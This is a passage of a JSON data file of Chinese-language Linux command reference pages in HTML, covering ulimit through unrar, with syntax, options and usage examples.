&lt;虚拟内存大小&gt;：指定可使用的虚拟内存上限，单位为KB。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ulimit -a</span>\ncore file <span class=\"hljs-built_in\">size</span>          (blocks, -c) <span class=\"hljs-number\">0</span>           <span class=\"hljs-comment\">#core文件的最大值为100 blocks。</span>\n<span class=\"hljs-title\">data</span> seg <span class=\"hljs-built_in\">size</span>           (kbytes, -d) unlimited   <span class=\"hljs-comment\">#进程的数据段可以任意大。</span>\nscheduling priority             (-<span class=\"hljs-built_in\">e</span>) <span class=\"hljs-number\">0</span>\nfile <span class=\"hljs-built_in\">size</span>               (blocks, -f) unlimited   <span class=\"hljs-comment\">#文件可以任意大。</span>\npending signals                 (-i) <span class=\"hljs-number\">98304</span>       <span class=\"hljs-comment\">#最多有98304个待处理的信号。</span>\n<span class=\"hljs-built_in\">max</span> locked memory       (kbytes, -l) <span class=\"hljs-number\">32</span>          <span class=\"hljs-comment\">#一个任务锁住的物理内存的最大值为32KB。</span>\n<span class=\"hljs-built_in\">max</span> memory <span class=\"hljs-built_in\">size</span>         (kbytes, -m) unlimited   <span class=\"hljs-comment\">#一个任务的常驻物理内存的最大值。</span>\nopen files                      (-n) <span class=\"hljs-number\">1024</span>        <span class=\"hljs-comment\">#一个任务最多可以同时打开1024的文件。</span>\npipe <span class=\"hljs-built_in\">size</span>            (<span class=\"hljs-number\">512</span> bytes, -p) <span class=\"hljs-number\">8</span>           <span class=\"hljs-comment\">#管道的最大空间为4096字节。</span>\nPOSIX message queues     (bytes, -q) <span class=\"hljs-number\">819200</span>      <span class=\"hljs-comment\">#POSIX的消息队列的最大值为819200字节。</span>\n<span class=\"hljs-keyword\">real</span>-time priority              (-r) <span class=\"hljs-number\">0</span>\nstack <span class=\"hljs-built_in\">size</span>              (kbytes, -s) <span class=\"hljs-number\">10240</span>       <span class=\"hljs-comment\">#进程的栈的最大值为10240字节。</span>\ncpu time               (seconds, -t) unlimited   <span class=\"hljs-comment\">#进程使用的CPU时间。</span>\n<span class=\"hljs-built_in\">max</span> user processes              (-u) <span class=\"hljs-number\">98304</span>       <span class=\"hljs-comment\">#当前用户同时打开的进程（包括线程）的最大个数为98304。</span>\nvirtual memory          (kbytes, -v) unlimited   <span class=\"hljs-comment\">#没有限制进程的最大地址空间。</span>\nfile locks                      (-x) unlimited   <span class=\"hljs-comment\">#所能锁住的文件的最大个数没有限制。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "umask",
        "des": "显示或设置创建文件的权限掩码。",
        "body": "<h1 id=\"umask\">umask</h1>\n<p>显示或设置创建文件的权限掩码。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">umask <span class=\"hljs-selector-attr\">[-p]</span> <span class=\"hljs-selector-attr\">[-S]</span> <span class=\"hljs-selector-attr\">[mode]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>显示当前的文件权限掩码。</li>\n<li>通过八进制数的方式设置创建文件的权限掩码。</li>\n<li>通过符号组合的方式设置创建文件的权限掩码。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>mode（可选）：八进制数或符号组合。</p>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-p：当没有参数时指定该选项，执行产生的输出格式可复用为输入；</span>\n<span class=\"hljs-deletion\">-S：以符号组合的方式输出创建文件的权限掩码，不使用该选项时以八进制数的形式输出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非给出了非法选项或非法参数。</p>\n<h2 id=\"例子\">例子</h2>\n<p><em>以下的例子均假设文件权限掩码为0022。</em></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 以八进制数的形式输出创建文件的权限掩码。</span>\n<span class=\"hljs-built_in\">umask</span> -p\n<span class=\"hljs-comment\"># 执行结果：</span>\n<span class=\"hljs-built_in\">umask</span> 0022\n<span class=\"hljs-comment\"># 以符号组合的方式输出创建文件的权限掩码。</span>\n<span class=\"hljs-built_in\">umask</span> -S\n<span class=\"hljs-comment\"># 执行结果：</span>\nu=rwx,g=rx,o=rx\n</code></pre>\n<blockquote>\n<p>参考<code>man chmod</code>文档的<code>DESCRIPTION</code>段落得知：</p>\n<ul>\n<li><code>u</code>符号代表当前用户。</li>\n<li><code>g</code>符号代表和当前用户在同一个组的用户，以下简称组用户。</li>\n<li><code>o</code>符号代表其他用户。</li>\n<li><code>a</code>符号代表所有用户。</li>\n<li><code>r</code>符号代表读权限以及八进制数<code>4</code>。</li>\n<li><code>w</code>符号代表写权限以及八进制数<code>2</code>。</li>\n<li><code>x</code>符号代表执行权限以及八进制数<code>1</code>。</li>\n<li><code>+</code>符号代表添加目标用户相应的权限。</li>\n<li><code>-</code>符号代表删除目标用户相应的权限。</li>\n<li><code>=</code>符号代表添加目标用户相应的权限，删除未提到的权限。</li>\n</ul>\n</blockquote>\n<p>那么刚才以符号形式输出的结果<code>u=rwx,g=rx,o=rx</code>转化为八进制数等于<code>0755</code>；</p>\n<p>用八进制数来设置同样的权限，<code>umask</code>需要额外的执行减法<code>0777 - 0755</code>即<code>0022</code>，而<code>chmod</code>不需要。</p>\n<p>符号组合模式的添加、删除、赋值权限。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加权限：</span>\n<span class=\"hljs-comment\"># 为组用户添加写权限。</span>\n<span class=\"hljs-built_in\">umask</span> g+w\n<span class=\"hljs-comment\"># 删除权限：</span>\n<span class=\"hljs-comment\"># 删除其他用户的写、执行权限</span>\n<span class=\"hljs-built_in\">umask</span> o-wx\n<span class=\"hljs-comment\"># 赋值权限：</span>\n<span class=\"hljs-comment\"># 赋值全部用户所有权限，等价于umask u=rwx,g=rwx,o=rwx</span>\n<span class=\"hljs-built_in\">umask</span> a=rwx\n<span class=\"hljs-comment\"># 清除其他用户的读、写、执行权限。</span>\n<span class=\"hljs-built_in\">umask</span> o=\n</code></pre>\n<p>创建文件夹、文件（假设当前目录不存在）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 创建文件</span>\ntouch test.sh\n<span class=\"hljs-meta\"># 查看权限，发现执行权限的设置不起作用。</span>\nstat test.sh\n<span class=\"hljs-meta\"># 创建文件夹</span>\ntouch <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">dir</span>\n<span class=\"hljs-meta\"># 查看权限，发现执行权限的设置可以起作用。</span>\nstat <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">dir</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</p>\n</li>\n<li><p><code>chmod</code>用于更改已有对象的权限，<code>umask</code>影响之后新建对象的权限。</p>\n</li>\n<li><p><strong>请谨慎使用该命令</strong>，特别是不要取消当前用户的读取权限，那样会导致你在终端使用<code>TAB</code>键补全时报错。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "umount",
        "des": "用于卸载已经加载的文件系统",
        "body": "<h1 id=\"umount\">umount</h1>\n<p>用于卸载已经加载的文件系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>umount命令</strong> 用于卸载已经加载的文件系统。利用设备名或挂载点都能umount文件系统，不过最好还是通过挂载点卸载，以免使用绑定挂载（一个设备，多个挂载点）时产生混乱。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">umount</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：卸除/etc/mtab中记录的所有文件系统；</span>\n<span class=\"hljs-deletion\">-h：显示帮助；</span>\n<span class=\"hljs-deletion\">-n：卸除时不要将信息存入/etc/mtab文件中；</span>\n<span class=\"hljs-deletion\">-r：若无法成功卸除，则尝试以只读的方式重新挂入文件系统；</span>\n<span class=\"hljs-deletion\">-t&lt;文件系统类型&gt;：仅卸除选项中所指定的文件系统；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统：指定要卸载的文件系统或者其对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>下面两条命令分别通过设备名和挂载点卸载文件系统，同时输出详细信息：</p>\n<p>通过设备名卸载</p>\n<pre><code class=\"language-shell\">umount -v <span class=\"hljs-regexp\">/dev/</span>sda1\n<span class=\"hljs-regexp\">/dev/</span>sda1 umounted\n</code></pre>\n<p>通过挂载点卸载</p>\n<pre><code class=\"language-shell\">umount -v <span class=\"hljs-regexp\">/mnt/mym</span>ount/\n<span class=\"hljs-regexp\">/tmp/</span>diskboot.img umounted\n</code></pre>\n<p>如果设备正忙，卸载即告失败。卸载失败的常见原因是，某个打开的shell当前目录为挂载点里的某个目录：</p>\n<pre><code class=\"language-shell\">umount -v <span class=\"hljs-regexp\">/mnt/mym</span>ount/\numount: <span class=\"hljs-regexp\">/mnt/mym</span>ount: device is busy\numount: <span class=\"hljs-regexp\">/mnt/mym</span>ount: device is busy\n</code></pre>\n<p>有时，导致设备忙的原因并不好找。碰到这种情况时，可以用lsof列出已打开文件，然后搜索列表查找待卸载的挂载点：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">lsof</span> | grep mymount         查找mymount分区里打开的文件\n<span class=\"hljs-attribute\">bash</span>   <span class=\"hljs-number\">9341</span>  francois  cwd   DIR   <span class=\"hljs-number\">8</span>,<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">1024</span>    <span class=\"hljs-number\">2</span> /mnt/mymount\n</code></pre>\n<p>从上面的输出可知，mymount分区无法卸载的原因在于，francois运行的PID为9341的bash进程。</p>\n<p>对付系统文件正忙的另一种方法是执行延迟卸载：</p>\n<pre><code class=\"language-shell\">umount -vl <span class=\"hljs-regexp\">/mnt/mym</span>ount/     执行延迟卸载\n</code></pre>\n<p>延迟卸载（lazy unmount）会立即卸载目录树里的文件系统，等到设备不再繁忙时才清理所有相关资源。卸载可移动存储介质还可以用eject命令。下面这条命令会卸载cd并弹出CD：</p>\n<pre><code class=\"language-shell\">eject <span class=\"hljs-regexp\">/dev/</span>cdrom      卸载并弹出CD \n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "unalias",
        "des": "删除由alias设置的别名",
        "body": "<h1 id=\"unalias\">unalias</h1>\n<p>删除由alias设置的别名</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">unalias [-a] <span class=\"hljs-built_in\">name</span> [<span class=\"hljs-built_in\">name</span> ...]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>删除一个或多个别名。</li>\n<li>删除全部已定义的别名。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">a</span>：删除全部已定义的别名。\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>name：指定要删除的一个或多个已定义的别名。</p>\n<h3 id=\"返回值\">返回值</h3>\n<p>unalias返回true除非您要删除的别名未定义。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 删除全部已定义的别名</span>\n<span class=\"hljs-keyword\">unalias</span> -a\n\n<span class=\"hljs-comment\"># 删除已定义的别名（假设当前环境存在以下别名）</span>\n<span class=\"hljs-keyword\">unalias</span> vi\n<span class=\"hljs-keyword\">unalias</span> <span class=\"hljs-keyword\">ls</span> grep\n</code></pre>\n<h2 id=\"错误用法\">错误用法</h2>\n<ul>\n<li><p>要删除的别名未定义。</p>\n</li>\n<li><p>不使用-a选项时没有传递name参数。</p>\n</li>\n</ul>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><strong>执行脚本时请注意：</strong></li>\n</ol>\n<blockquote>\n<p>使用<code>source</code>命令执行的bash脚本如果执行了<code>alias</code>或<code>unalias</code>命令，那么有可能会对终端环境的别名设置产生影响；终端环境的别名设置也可能改变运行结果；</p>\n<p>通过<code>sh</code>方式调用的bash脚本或直接运行当前用户有执行权限的脚本不受终端环境的别名影响。</p>\n</blockquote>\n<ol start=\"2\">\n<li><p>查看及设置别名，请查看<code>alias</code>命令。</p>\n</li>\n<li><p>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "uname",
        "des": "打印系统信息。",
        "body": "<h1 id=\"uname\">uname</h1>\n<p>打印系统信息。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">uname [<span class=\"hljs-symbol\">OPTION</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>打印机器和操作系统的信息。</li>\n<li>当没有选项时，默认启用 <code>-s</code> 选项。</li>\n<li>如果给出多个选项或 <code>-a</code> 选项时，输出信息按以下字段排序：内核名称 主机名称 内核release 内核版本\n机器名称 处理器 硬件平台 操作系统。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-<span class=\"hljs-keyword\">a</span>, <span class=\"hljs-comment\">--all                  按顺序打印全部信息，如果 -p 和 -i 的信息是未知，那么省略。</span>\n-s, <span class=\"hljs-comment\">--kernel-name          打印内核名称。</span>\n-n, <span class=\"hljs-comment\">--nodename             打印网络节点主机名称。</span>\n-r, <span class=\"hljs-comment\">--kernel-release       打印内核release。</span>\n-v, <span class=\"hljs-comment\">--kernel-version       打印内核版本。</span>\n-m, <span class=\"hljs-comment\">--machine              打印机器名称。</span>\n-p, <span class=\"hljs-comment\">--processor            打印处理器名称。</span>\n-i, <span class=\"hljs-comment\">--hardware-platform    打印硬件平台名称。</span>\n-o, <span class=\"hljs-comment\">--operating-system     打印操作系统名称。</span>\n<span class=\"hljs-comment\">--help                     显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version                  显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 单独使用uname命令时相当于uname -s</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname</span>\nLinux\n</code></pre>\n<pre><code class=\"language-shell\"># 查看全部信息\n[root<span class=\"hljs-title\">@localhost</span> ~]# uname -a\nLinux localhost <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span><span class=\"hljs-number\">-348.6</span>.<span class=\"hljs-number\">1</span>.el<span class=\"hljs-number\">5</span> <span class=\"hljs-variable\">#1</span> SMP Tue May <span class=\"hljs-number\">21</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">22</span> EDT <span class=\"hljs-number\">2013</span> <span class=\"hljs-type\">i686</span> <span class=\"hljs-type\">i686</span> <span class=\"hljs-type\">i386</span> GNU/Linux\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 分别列出信息</span>\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -m</span>\ni686\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -n</span>\nlocalhost\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -r</span>\n<span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.18</span><span class=\"hljs-number\">-4</span><span class=\"hljs-number\">-686</span>\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -s</span>\nLinux\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -v</span>\n<span class=\"hljs-meta\">#1 SMP Tue May 21 15:34:22 EDT 2013</span>\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -p</span>\ni686\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -i</span>\ni386\n\n[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># uname -o</span>\nGNU/Linux\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 uname</code>，<code>info coreutils 'uname invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "unarj",
        "des": "解压缩由arj命令创建的压缩包",
        "body": "<h1 id=\"unarj\">unarj</h1>\n<p>解压缩由arj命令创建的压缩包</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>unarj命令</strong> 用来解压缩由arj命令创建的压缩包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">unarj</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">e：解压缩.arj文件；\nl：显示压缩文件内所包含的文件；\n<span class=\"hljs-built_in\">t</span>：检查压缩文件是否正确；\nx：解压缩时保留原有的路径。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>.arj压缩包：指定要解压缩的.arj压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "uncompress",
        "des": "用来解压.Z文件",
        "body": "<h1 id=\"uncompress\">uncompress</h1>\n<p>用来解压.Z文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>uncompress命令</strong> 用来解压缩由compress命令压缩后产生的“.Z”压缩包。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">uncompress</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：不提示用户，强制覆盖掉目标文件；</span>\n<span class=\"hljs-deletion\">-c：将结果送到标准输出，无文件被改变；</span>\n<span class=\"hljs-deletion\">-r：递归的操作方式。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要压缩的“.Z”压缩包。</p>\n<h3 id=\"实例\">实例</h3>\n<p>先创建一个.Z压缩文件</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">compress FileName</span>\n</code></pre>\n<p>解压：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">uncompress</span> <span class=\"hljs-built_in\">FileName</span><span class=\"hljs-operator\">.</span><span class=\"hljs-variable\">Z</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "unexpand",
        "des": "将文件的空白字符转换为制表符",
        "body": "<h1 id=\"unexpand\">unexpand</h1>\n<p>将文件的空白字符转换为制表符</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>unexpand命令</strong> 用于将给定文件中的空白字符（space）转换为制表符（TAB），并把转换结果显示在标准输出设备（显示终端）。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">unexpand</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-a或--all：转换文件中所有的空白字符；\n--first-only：仅转换开头的空白字符；\n-<span class=\"hljs-built_in\">t</span>&lt;<span class=\"hljs-built_in\">N</span>&gt;：指定TAB所代表的<span class=\"hljs-built_in\">N</span>个（<span class=\"hljs-built_in\">N</span>为整数）字符数，默认<span class=\"hljs-built_in\">N</span>值是<span class=\"hljs-number\">8</span>。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要转换空白为TAB的文件列表。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "uniq",
        "des": "显示或忽略重复的行。",
        "body": "<h1 id=\"uniq\">uniq</h1>\n<p>显示或忽略重复的行。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">uni<span class=\"hljs-string\">q [OPTION]</span>... [INPUT [OUTPUT]]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>将输入文件（或标准输入）中邻近的重复行写入到输出文件（或标准输出）中。</li>\n<li>当没有选项时，邻近的重复行将合并为一个。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c, --count                在每行开头增加重复次数。</span>\n<span class=\"hljs-deletion\">-d, --repeated             所有邻近的重复行只被打印一次。</span>\n<span class=\"hljs-deletion\">-D                         所有邻近的重复行将全部打印。</span>\n<span class=\"hljs-deletion\">--all-repeated[=METHOD]    类似于 -D，但允许每组之间以空行分割。METHOD取值范围{none(默认)，prepend，separate}。</span>\n<span class=\"hljs-deletion\">-f, --skip-fields=N        跳过对前N个列的比较。</span>\n<span class=\"hljs-deletion\">--group[=METHOD]           显示所有行，允许每组之间以空行分割。METHOD取值范围：{separate(默认)，prepend，append，both}。</span>\n<span class=\"hljs-deletion\">-i, --ignore-case          忽略大小写的差异。</span>\n<span class=\"hljs-deletion\">-s, --skip-chars=N         跳过对前N个字符的比较。</span>\n<span class=\"hljs-deletion\">-u, --unique               只打印非邻近的重复行。</span>\n<span class=\"hljs-deletion\">-z, --zero-terminated      设置行终止符为NUL（空），而不是换行符。</span>\n<span class=\"hljs-deletion\">-w, --check-chars=N        只对每行前N个字符进行比较。</span>\n<span class=\"hljs-deletion\">--help                     显示帮助信息并退出。</span>\n<span class=\"hljs-deletion\">--version                  显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>INPUT（可选）：输入文件，不提供时为标准输入。</p>\n<p>OUTPUT（可选）：输出文件，不提供时为标准输出。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<p>注意：命令2和命令3结果一样，命令1仅作了相邻行的去重。</p>\n<pre><code class=\"language-shell\">uniq <span class=\"hljs-keyword\">file</span>.txt\n<span class=\"hljs-keyword\">sort</span> <span class=\"hljs-keyword\">file</span>.txt | uniq\n<span class=\"hljs-keyword\">sort</span> -u <span class=\"hljs-keyword\">file</span>.txt\n</code></pre>\n<p>只显示单一行，区别在于是否执行排序：</p>\n<pre><code class=\"language-shell\">uniq -u <span class=\"hljs-keyword\">file</span>.txt\n<span class=\"hljs-keyword\">sort</span> <span class=\"hljs-keyword\">file</span>.txt | uniq -u\n</code></pre>\n<p>统计各行在文件中出现的次数：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">sort</span> <span class=\"hljs-keyword\">file</span>.txt | uniq -c\n</code></pre>\n<p>在文件中找出重复的行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">sort</span> <span class=\"hljs-keyword\">file</span>.txt | uniq -d\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p><code>uniq</code>只检测邻近的行是否重复，<code>sort -u</code>将输入文件先排序然后再处理重复行。 </p>\n</li>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 uniq</code>，<code>info coreutils 'uniq invocation'</code>。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "unlink",
        "des": "系统调用函数unlink去删除指定的文件",
        "body": "<h1 id=\"unlink\">unlink</h1>\n<p>系统调用函数unlink去删除指定的文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>unlink命令</strong> 用于系统调用函数unlink去删除指定的文件。和rm命令作用一样，都是删除文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">unlink</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：显示帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要删除的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "unprotoize",
        "des": "删除C语言源代码文件中的函数原型",
        "body": "<h1 id=\"unprotoize\">unprotoize</h1>\n<p>删除C语言源代码文件中的函数原型</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>unprotoize命令</strong> 属于gcc套件，用于删除C语言源代码文件中的函数原型。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">unprotoize</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：设置需要转换代码的目录；</span>\n<span class=\"hljs-deletion\">-x：转换代码时排除的文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：需要转换代码的C语言源文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "unrar",
        "des": "解压rar文件命令，从rar档案中提取文件",
        "body": "<h1 id=\"unrar\">unrar</h1>\n<p>解压rar文件命令，从rar档案中提取文件</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">unrar <span class=\"hljs-selector-attr\">[选项]</span><span class=\"hljs-selector-attr\">[switch 命令]</span> <span class=\"hljs-selector-attr\">[文件名...]</span><span class=\"hljs-selector-attr\">[路径]</span>\n   unrar &lt;command&gt; <span class=\"hljs-selector-attr\">[-&lt;switch 1&gt; -&lt;switch N&gt;]</span> archive <span class=\"hljs-selector-attr\">[files...]</span> <span class=\"hljs-selector-attr\">[path...]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">       - <span class=\"hljs-built_in\">e</span>  <span class=\"hljs-comment\">#将文件解压缩到当前目录。</span>\n       -l    <span class=\"hljs-comment\"># 列出存档内容。</span>\n       -p   <span class=\"hljs-comment\">#将文件打印到标准输出。</span>\n       -t    <span class=\"hljs-comment\">#测试存档文件。</span>\n       -v    <span class=\"hljs-comment\">#详细列出存档。</span>\n       -x    <span class=\"hljs-comment\">#使用完整路径提取文件。</span>\n</code></pre>\n<h3 id=\"switches--开关设置\">SWITCHES  开关设置</h3>\n<pre><code class=\"language-shell\">       注意：每个开关必须用空格分隔。你不能把它们放在一起。\n       -av-      <span class=\"hljs-comment\">#禁用真实性验证检查。</span>\n    -c-         <span class=\"hljs-comment\">#禁用评论显示</span>\n       -f            <span class=\"hljs-comment\">#刷新文件</span>\n       -kb        <span class=\"hljs-comment\">#保留破碎的提取文件</span>\n       -ierr      <span class=\"hljs-comment\">#将所有消息发送给stderr。</span>\n       -inul     <span class=\"hljs-comment\">#禁用所有消息。</span>\n       -o+        <span class=\"hljs-comment\">#覆盖现有文件。</span>\n       -o-         <span class=\"hljs-comment\">#不要覆盖现有文件</span>\n       -p<span class=\"hljs-variable\">&lt;password&gt;</span>\n                     <span class=\"hljs-comment\">#设置密码。</span>\n       -p-        <span class=\"hljs-comment\">#不查询密码</span>\n       -r           <span class=\"hljs-comment\">#递归子目录。</span>\n       -u          <span class=\"hljs-comment\">#更新文件。</span>\n       -v           <span class=\"hljs-comment\">#列出所有卷。</span>\n       -x<span class=\"hljs-variable\">&lt;file&gt;</span>\n                     <span class=\"hljs-comment\">#排除指定的文件。</span>\n       -x<span class=\"hljs-meta\">@&lt;list&gt;</span>\n                     <span class=\"hljs-comment\">#排除指定列表文件中的文件。</span>\n       -x@      <span class=\"hljs-comment\">#读取要从stdin中排除的文件名。</span>\n       -y          <span class=\"hljs-comment\">#对所有查询都假设为是。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目录：指定要显示列表的目录，也可以是具体的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将压缩文件text.rar在当前目录下解压缩,并解压完整路径。</p>\n<pre><code class=\"language-shell\">unrar x <span class=\"hljs-keyword\">test</span>.rar\n</code></pre>\n<h3 id=\"author\">AUTHOR</h3>\n<pre><code class=\"language-shell\">       This  manual  page  was  written <span class=\"hljs-keyword\">by</span> Petr Cech &lt;cech@debian.org&gt; according <span class=\"hljs-built_in\">to</span> <span class=\"hljs-string\">\"unrar -h\"</span><span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">the</span> Debian\n       GNU/Linux <span class=\"hljs-keyword\">system</span> (but may be used <span class=\"hljs-keyword\">by</span> others).\n</code></pre>\n"
    },
    {
        "title": "unset",
        "des": "删除指定的shell变量或函数。",
